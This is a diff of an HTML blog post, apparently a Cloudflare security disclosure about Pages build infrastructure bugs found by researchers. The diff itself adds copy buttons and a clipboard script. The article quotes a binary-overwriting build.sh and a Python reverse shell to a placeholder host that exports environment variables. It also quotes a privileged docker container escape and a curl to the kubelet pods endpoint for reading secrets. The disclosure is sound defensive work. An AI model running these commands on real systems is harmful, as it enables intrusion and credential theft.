@@ -35,14 +35,40 @@
 <p>In this case the attack is simple. When a Pages build runs, the following <code>build.sh</code> is specified to run, and it can overwrite the executable with a new one.</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6a737d-8b8b8b94">#!/bin/bash</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">cp</span><span class="sk-032f62-99ffe4"> pages-metadata-generator</span><span class="sk-032f62-99ffe4"> /opt/pages/bin/pages-metadata-generator</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">cp</span><span class="sk-032f62-99ffe4"> pages-metadata-generator</span><span class="sk-032f62-99ffe4"> /opt/pages/bin/pages-metadata-generator</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
+<script type="module">
+	globalThis.process ??= {}, globalThis.process.env ??= {}, document.querySelectorAll(`[data-code-copy]`).forEach(e => {
+		let t = e.closest(`.emdash-code`)?.querySelector(`pre code`);
+		if (!t) return;
+		let n = e.dataset.copyLabel ?? ``,
+			r = e.dataset.copiedLabel ?? ``,
+			i = null;
+		e.addEventListener(`click`, () => {
+			navigator.clipboard.writeText(t.textContent ?? ``).then(() => {
+				e.setAttribute(`data-copied`, ``), e.setAttribute(`aria-label`, r), i && clearTimeout(i), i = setTimeout(() => {
+					e.removeAttribute(`data-copied`), e.setAttribute(`aria-label`, n), i = null
+				}, 1500)
+			}).catch(e => {
+				console.warn(`code-copy: clipboard write failed`, e)
+			})
+		})
+	});
+</script>
 <p>This allows the attacker to provide their own <code>pages-metadata-generator</code> program that is run with a populated set of environment variables. The proof of concept provided to Cloudflare was this minimal reverse shell.</p>
 <div class="emdash-code">
 	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6a737d-8b8b8b94">#!/bin/bash</span></span>
 <span class="line"><span class="sk-005cc5-ffc799">echo</span><span class="sk-032f62-99ffe4"> "henlo fren"</span></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">export</span><span class="sk-d73a49-a0a0a0"> &gt;</span><span class="sk-24292e-fff"> /tmp/envvars</span></span>
-<span class="line"><span class="sk-6f42c1-ffc799">python</span><span class="sk-005cc5-99ffe4"> -c</span><span class="sk-032f62-99ffe4"> 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x.x",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span></code></pre>
+<span class="line"><span class="sk-6f42c1-ffc799">python</span><span class="sk-005cc5-99ffe4"> -c</span><span class="sk-032f62-99ffe4"> 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x.x",9448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>With a reverse shell, the attackers only need to run `env` to see a list of environment variables that the program was invoked with. We fixed the file permissions of the process, rotated the credentials, and investigated in Cloudflare audit logs to confirm that the sensitive credentials had not been used by anyone other than our build infrastructure, and within the scope of the security research.</p>
 <h3>Bug 4: Bash path injection</h3>
@@ -52,7 +78,11 @@
 <h3>Bug 5: Azure pipelines escape</h3>
 <p>Back when this research was conducted we were running Cloudflare Pages on Azure Pipelines. Builds were taking place in highly privileged containers and the containers had the docker socket available to them. Once the researchers had root within these containers, escaping them was trivial after installing docker and mounting the root directory of the host machine.</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">sudo</span><span class="sk-032f62-99ffe4"> docker</span><span class="sk-032f62-99ffe4"> run</span><span class="sk-005cc5-99ffe4"> -ti</span><span class="sk-005cc5-99ffe4"> --privileged</span><span class="sk-005cc5-99ffe4"> --net=host</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /:/host</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /dev:/dev</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /run:/run</span><span class="sk-032f62-99ffe4"> ubuntu:latest</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">sudo</span><span class="sk-032f62-99ffe4"> docker</span><span class="sk-032f62-99ffe4"> run</span><span class="sk-005cc5-99ffe4"> -ti</span><span class="sk-005cc5-99ffe4"> --privileged</span><span class="sk-005cc5-99ffe4"> --net=host</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /:/host</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /dev:/dev</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-032f62-99ffe4"> /run:/run</span><span class="sk-032f62-99ffe4"> ubuntu:latest</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>Once they had root on the host machine, they were able to recover Azure DevOps credentials from the host which gave access to the Azure Organization that Cloudflare Pages was running within.</p>
 <p>The credentials that were recovered gave access to highly audited APIs where we could validate that this issue was not previously exploited outside this security research.</p>
@@ -60,7 +90,11 @@
 <p>After receipt of the above bugs, &nbsp;we decided to change the architecture &nbsp;of Pages. One of these changes was migration of the product from Azure to Kubernetes, and simplifying the workflow, so the attack surface was smaller and defensive programming practices were easier to implement. After the change, Pages builds are within Kubernetes Pods and are seeded with the minimum set of credentials needed.</p>
 <p>As part of this migration, we left off a very important iptables rule in our Kubernetes control plane, making it easy to <code>curl</code> the Kubernetes API and read secrets related to other Pods in the cluster (each Pod representing a separate Pages build).</p>
 <div class="emdash-code">
-	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-005cc5-99ffe4"> -k</span><span class="sk-24292e-fff"> [http://10.124.200.1:10255/pods](</span><span class="sk-6f42c1-ffc799">http://10.124.200.1:10255/pods</span><span class="sk-24292e-fff">)</span></span></code></pre>
+	<pre class="shiki shiki-themes github-light vesper" tabindex="0"><code><span class="line"><span class="sk-6f42c1-ffc799">curl</span><span class="sk-005cc5-99ffe4"> -v</span><span class="sk-005cc5-99ffe4"> -k</span><span class="sk-24292e-fff"> [http://10.124.200.1:10255/pods](</span><span class="sk-6f42c1-ffc799">http://10.124.200.1:10255/pods</span><span class="sk-24292e-fff">)</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="Copy code" data-copy-label="Copy code" data-copied-label="Code copied!"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
 <p>We quickly patched this issue with iptables rules to block network connections to the Kubernetes control plane. One of the secrets available to each Pod was the GitHub OAuth secret which would have allowed someone who exploited this issue to read the GitHub repositories of other Pages' customers.</p>
 <p>In the previously reported issues we had robust logs that showed us that the attacks that were being performed had never been performed by anyone else. The logs related to inspecting Pods were not available to us, so we decided to notify all Cloudflare Pages customers that had ever had a build run on our Kubernetes-based infrastructure. After patching the issue and investigating which customers were impacted, we emailed impacted customers on February 3 to tell them that it’s possible someone other than the researcher had exploited this issue, because our logs couldn’t prove otherwise.</p>
